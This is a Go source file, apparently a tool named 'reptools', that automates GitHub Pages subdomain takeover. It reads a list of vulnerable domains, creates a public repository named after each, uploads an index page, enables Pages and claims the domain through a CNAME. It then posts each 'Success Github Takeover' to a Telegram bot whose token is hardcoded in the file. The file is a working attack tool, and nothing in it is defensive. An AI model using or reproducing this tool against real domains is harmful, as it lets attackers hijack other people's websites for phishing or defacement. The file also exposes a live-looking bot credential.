package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	result_tg []string
)

type OptionsCname struct {
	Cname  string `json:"cname"`
	Source struct {
		Branch string `json:"branch"`
		Path   string `json:"path"`
	} `json:"source"`
}
type Options struct {
	Source struct {
		Branch string `json:"branch"`
		Path   string `json:"path"`
	} `json:"source"`
}
type CreateRepoBody struct {
	Name        string `json:"name"`
	Description string `json:"description"`
	Private     bool   `json:"private"`
}

func chatID() string {
	chatID, err := os.ReadFile("telegram_id.txt")
	if err != nil {
		panic(err)
	}
	return string(chatID)

}
func username() string {
	username, err := os.ReadFile("username.txt")
	if err != nil {
		panic(err)
	}
	return string(username)
}
func token() string {
	token, err := os.ReadFile("token.txt")
	if err != nil {
		panic(err)
	}
	return string(token)
}
func createRepo(domain string) {
	apiUrl := "https://api.github.com/user/repos"
	// username := "<your-github-username>"
	// Create the JSON request body
	requestBody := CreateRepoBody{
		Name:        domain,
		Description: "takeover by reptools",
		Private:     false,
	}
	requestBodyBytes, err := json.Marshal(requestBody)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Create the HTTP request
	req, err := http.NewRequest("POST", apiUrl, bytes.NewBuffer(requestBodyBytes))
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", fmt.Sprintf("token %s", token()))

	// Make the HTTP request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	body, _ := io.ReadAll(resp.Body)
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode != http.StatusCreated {
		fmt.Println("cant create a repo", resp.StatusCode, string(body))
		if strings.Contains(string(body), "You have exceeded a secondary rate limit") {
			fmt.Println("got limit bro you account github ")
			os.Exit(1)
		}
		return
	}

	fmt.Println("Repository created successfully Continue to takeover")
	UploadFiles(username(), domain)

}
func UploadFiles(username string, repo string) {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/index.html", username, repo)
	file, err := os.Open("index.html")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
	fileContents, err := io.ReadAll(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	// Create the multipart request body
	// Create the commit object
	commit := map[string]string{
		"message": "TakeOver Index",
		"content": base64.StdEncoding.EncodeToString(fileContents),
	}
	commitJSON, err := json.Marshal(commit)
	if err != nil {
		fmt.Println(err)
		return
	}
	// Create the HTTP request
	req, err := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(commitJSON))
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", fmt.Sprintf("token %s", token()))

	// Make the HTTP request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	// Check the response status code
	if resp.StatusCode != http.StatusCreated {
		fmt.Println(string(body), "Failed to upload file")
		return
	}

	fmt.Println("File uploaded successfully, Wait 3 sec to uploads")
	time.Sleep(2 * time.Second)
	TurnOnPages(username, repo, repo)

}
func TurnOnPages(username string, repo string, domain string) {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/pages", username, repo)
	// username := "<your-github-username>"
	// Create the JSON request body
	options := Options{
		Source: struct {
			Branch string `json:"branch"`
			Path   string `json:"path"`
		}{
			Branch: "main",
			Path:   "/",
		},
	}
	requestBodyBytes, err := json.Marshal(options)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Create the HTTP request
	req, err := http.NewRequest("POST", apiUrl, bytes.NewBuffer(requestBodyBytes))
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", fmt.Sprintf("token %s", token()))

	// Make the HTTP request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		fmt.Println(string(body) + apiUrl + "cant create a pages")
		return
	}

	fmt.Println("succes create a pages wait for 3 secs")
	Cname(username, repo, domain)
}

func Cname(username string, repo string, domain string) {
	apiUrl := fmt.Sprintf("https://api.github.com/repos/%s/%s/pages", username, repo)
	// username := "<your-github-username>"
	// Create the JSON request body
	options := OptionsCname{
		Cname: domain,
		Source: struct {
			Branch string `json:"branch"`
			Path   string `json:"path"`
		}{
			Branch: "main",
			Path:   "/",
		},
	}
	requestBodyBytes, err := json.Marshal(options)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Create the HTTP request
	req, err := http.NewRequest("PUT", apiUrl, bytes.NewBuffer(requestBodyBytes))
	if err != nil {
		fmt.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", fmt.Sprintf("token %s", token()))

	// Make the HTTP request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != 204 {
		body, _ := io.ReadAll(resp.Body)
		fmt.Println(string(body))
		fmt.Println("cant takeover")
		return
	}
	fmt.Println("succes takeover : " + domain + " wait for 1-5 min to successfully configured")
	result_tg = append(result_tg, domain)
}

const telegramBotToken = "5906773207:AAGdCFNi_xOLTV8TZZHt1j4jM16pvlVQ4Fo"
const telegramApiUrl = "https://api.telegram.org/bot"

type sendMessageRequestBody struct {
	ChatId int64  `json:"chat_id"`
	Text   string `json:"text"`
}

func Tg(results []string) {
	id, err := strconv.Atoi(chatID())
	if err != nil {
		log.Fatal(err)
	}
	chatId := int64(id)
	var message string
	for _, s := range results {
		message += fmt.Sprintf("[REPLOGS] Success Github Takeover : %s\n", s)
	}
	requestBody := &sendMessageRequestBody{
		ChatId: chatId,
		Text:   message,
	}
	requestBodyBytes, _ := json.Marshal(requestBody)

	apiUrl := telegramApiUrl + telegramBotToken + "/sendMessage"
	resp, err := http.Post(apiUrl, "application/json", bytes.NewBuffer(requestBodyBytes))
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
}
func main() {
	var list string
	fmt.Println("list vuln github (without http/https) : ")
	fmt.Scan(&list)
	file, err := os.Open(list)
	if err != nil {
		fmt.Printf("Error opening file: %s\n", err)
		return
	}
	defer file.Close()

	// Create a scanner to read the file line by line
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		// Process the current line
		line := scanner.Text()
		if !strings.HasPrefix(line, "http://") {
			line = "http://" + line
		}
		resp, err := http.Get(line)
		if err != nil {
			fmt.Println("cant access the sites : ", line, err)
			return
		}
		defer resp.Body.Close()

		if resp.StatusCode >= 300 && resp.StatusCode <= 399 {
			resp, err := resp.Location()
			if err != nil {
				fmt.Println("cant get access the redirected sites : ", resp)
				return
			}
			fmt.Println("Redirected to:", resp.String())
			line = resp.String()
		} else {
			fmt.Println("Not redirected")
		}
		line = strings.TrimPrefix(line, "http://")
		line = strings.TrimPrefix(line, "https://")
		createRepo(line)
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("Error scanning file: %s\n", err)
		return
	}
	Tg(result_tg)

}
